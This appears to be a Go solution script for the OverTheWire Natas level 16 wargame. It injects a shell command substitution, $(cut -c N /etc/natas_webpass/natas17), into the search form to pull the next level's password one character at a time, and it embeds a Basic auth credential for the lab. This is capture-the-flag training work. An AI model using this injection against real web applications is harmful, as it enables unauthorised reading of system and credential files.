package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strings"
	"github.com/PuerkitoBio/goquery"
)

const (
	formurl    = "http://natas16.natas.labs.overthewire.org/"
)

func main() {
	formData := url.Values{}
	password := ""
	pos := 1
	for pos < 33 {
			payload := `$(cut -c ` + fmt.Sprint(pos) + ` /etc/natas_webpass/natas17)`
			formData.Set("needle", payload)
			formData.Set("submit", "Search")

			req, err := http.NewRequest("POST", formurl, strings.NewReader(formData.Encode()))
			if err != nil {
				log.Fatalf("Failed to create req")
			}

			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Set("Authorization", "Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw==")

			client := &http.Client{}

			resp, err := client.Do(req)
			if err != nil {
				log.Fatalf("Failed to send req")
			}
			defer resp.Body.Close()

			responseBody, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatalf("Failed to read resp")
			}
			doc, err := goquery.NewDocumentFromReader(strings.NewReader(string(responseBody)))
			if err != nil {
				log.Fatalf("Failed to parse html")
			}
			doc.Find("pre").Each(func(i int, s *goquery.Selection) {
				if len(s.Text()) != 0 {
				password += guess(s.Text())
//				fmt.Println(s.Text())
} else { password += "(" }
				fmt.Printf("%s\n",password)
			})
			
			pos += 1
	}
}

func guess(s string) string {
	guess_set := ""
	//GuessSet finding
	for _, i := range s {
		if i == '\n' {
			break
		}
		guess_set += string(i)
	}

	fmt.Println(guess_set)

	for _, a := range guess_set {
		statusChar := 1
		status := 0
		for _, b := range s {
			if b == '\n' && status == 0 {
				statusChar = 0
				break
			} else if b == '\n' && status == 1 {
				status = 0
				continue
			} else if strings.ToLower(string(b)) == strings.ToLower(string(a)) {
				status = 1 
			}
		}
		if statusChar == 1 {
			return string(a)
		}
	}


	return ""
}
